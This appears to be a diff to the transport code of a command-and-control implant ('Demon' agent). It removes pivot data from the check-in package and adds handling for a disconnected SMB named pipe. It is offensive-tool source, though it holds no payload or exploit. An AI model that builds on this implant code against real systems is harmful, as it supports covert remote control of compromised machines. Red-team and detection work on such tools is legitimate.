@@ -157,31 +157,6 @@ BOOL TransportInit( PPACKAGE Package )
     PackageAddInt32( Package, Instance->Config.Sleeping );
 
     // End of Options
-    {
-        DWORD Count = PivotCount();
-
-        if ( Count > 0 )
-        {
-            PackageAddInt32( Package, DEMON_CHECKIN_OPTION_PIVOTS );
-            PackageAddInt32( Package, Count );
-
-            PPIVOT_DATA TempList = Instance->SmbPivots;
-            Count = 0;
-            do {
-                if ( TempList )
-                {
-                    PRINTF( "Checkin Option Pivot: Count:[%d] TempList->Package:[%p] TempList->PackageSize:[%d]\n", Count, TempList->Package, TempList->PackageSize )
-
-                    PackageAddInt32( Package, TempList->DemonID );
-                    PackageAddBytes( Package, TempList->Package, TempList->PackageSize );
-
-                    TempList = TempList->Next;
-                    Count++;
-                } else
-                    break;
-            } while ( TRUE );
-        }
-    }
 
     if ( Initialize )
     {
@@ -449,10 +424,22 @@ LEAVE:
 
         Success = Instance->Win32.WriteFile( Instance->Config.Transport.Handle, Data, Size, &Size, NULL );
 
-#ifdef DEBUG
         if ( ! Success )
+        {
+            // Means that the client disconnected/the pipe is closing.
+            if ( NtGetLastError() == ERROR_NO_DATA )
+            {
+                if ( Instance->Config.Transport.Handle )
+                {
+                    Instance->Win32.NtClose( Instance->Config.Transport.Handle );
+                    Instance->Config.Transport.Handle = NULL;
+                }
+
+                Instance->Session.Connected = FALSE;
+            }
+
             PRINTF( "WriteFile Failed:[%d]\n", NtGetLastError() );
-#endif
+        }
 
         if ( RecvData )
             *RecvData = TransportRecv( RecvSize );
